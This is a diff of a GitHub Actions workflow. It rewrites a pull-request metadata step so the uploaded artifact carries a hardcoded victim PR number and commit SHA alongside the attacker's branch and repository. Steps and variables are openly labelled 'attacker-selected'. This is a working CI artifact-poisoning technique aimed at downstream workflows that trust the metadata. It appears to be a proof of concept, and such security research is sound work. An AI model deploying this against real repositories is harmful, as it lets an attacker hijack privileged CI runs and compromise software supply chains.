@@ -4,7 +4,6 @@ on:
   pull_request:
     types: [opened, synchronize, reopened]
     paths:
-      - attacker-trigger.txt
       - .github/workflows/build-and-test.yml
 
 permissions:
@@ -14,24 +13,24 @@ jobs:
   pr-ci-metadata:
     runs-on: ubuntu-latest
     steps:
-      - name: Write normal PR metadata
+      - name: Write attacker-selected PR metadata
         env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
-          HEAD_REF: ${{ github.event.pull_request.head.ref }}
-          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+          VICTIM_PR: '1'
+          VICTIM_SHA: '72c70a04a5ba9142ca50832618c8607f925692b5'
+          ATTACKER_REF: ${{ github.event.pull_request.head.ref }}
+          ATTACKER_REPO: ${{ github.event.pull_request.head.repo.full_name }}
           BASE_REF: ${{ github.event.pull_request.base.ref }}
         run: |
           mkdir -p pr-ci-metadata
           jq -n \
-            --argjson number "$PR_NUMBER" \
-            --arg headSha "$HEAD_SHA" \
-            --arg headRef "$HEAD_REF" \
-            --arg headRepo "$HEAD_REPO" \
+            --argjson number "$VICTIM_PR" \
+            --arg headSha "$VICTIM_SHA" \
+            --arg headRef "$ATTACKER_REF" \
+            --arg headRepo "$ATTACKER_REPO" \
             --arg baseRef "$BASE_REF" \
             '{number:$number,headSha:$headSha,headRef:$headRef,headRepo:$headRepo,baseRef:$baseRef,isFork:true}' \
             > pr-ci-metadata/pr.json
-      - name: Upload PR metadata
+      - name: Upload attacker-selected PR metadata
         uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
         with:
           name: pr-ci-metadata
